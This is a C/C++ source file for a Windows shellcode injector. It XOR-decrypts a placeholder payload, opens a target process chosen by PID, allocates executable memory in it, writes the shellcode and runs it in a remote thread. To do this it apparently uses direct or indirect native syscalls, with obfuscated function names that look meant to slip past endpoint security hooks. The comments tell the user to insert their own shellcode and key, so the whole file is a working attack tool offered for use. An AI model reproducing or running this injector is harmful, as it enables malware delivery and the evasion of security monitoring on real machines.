#include <windows.h>
#include <stdio.h>
#include "wanka.h"

//bring in and define external variables
extern "C" {
    DWORD CSSN;
    DWORD OPSSN;
    DWORD CTSSN;
    DWORD WVMSSN;
    DWORD WFSOSSN;
    DWORD AVMSSN;

    UINT_PTR NtCreateTimerSyscall;
    UINT_PTR NtOpenTimerSyscall;
    UINT_PTR NtSetTimerSyscall;
    UINT_PTR NtQueryTimerSyscall;
    UINT_PTR NtCancelTimerSyscall;
}

//define XOR encrypted shellcode
unsigned char shellcode[] =
"SHELLCODE";

int main(int argc, char* argv[]) {

    //decrypt shellcode
    char key[] = "SHELLCODE KEY";
    int ciphertext_length = sizeof(shellcode);
    //you can just delete the following line if you do not XOR encrypt your shellcode
    xor_decrypt(shellcode, ciphertext_length, key);

    //define necessary variables for use
    SIZE_T rS = sizeof(shellcode);
    LARGE_INTEGER timeout;
    timeout.QuadPart = -1100;
    HANDLE pH = NULL;
    HANDLE nT = NULL;
    DWORD PID = NULL;
    PVOID bA = NULL;
    NTSTATUS STATUS = NULL;

    //check if PID was passed as argument, if not exit
    if (argc < 2) {
        printf("run with %s: <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID = { (HANDLE)(uintptr_t)PID, NULL };

    //open process with the passed PID
    STATUS = OP(&pH, ((0x000F0000L) | (0x00100000L) | 0xFFFF), &OA, &CID);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }
    
    //allocate memory inside of the process
    STATUS = AVM(pH, &bA, 0, &rS, 0x00001000 | 0x00002000, 0x40);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //write the shellcode to the allocated region
    STATUS = WVM(pH, bA, shellcode, sizeof(shellcode), NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //create and execute thread with the previously written shellcode
    STATUS = CT(&nT, THREAD_ALL_ACCESS, NULL, pH, bA, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //wait for thread to be fully executed
    STATUS = WFSO(nT, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //cleanup by closing thread and closing process handle
    if (nT) {
        C(nT);
    }
    if (pH) {
        C(pH);
    }
}
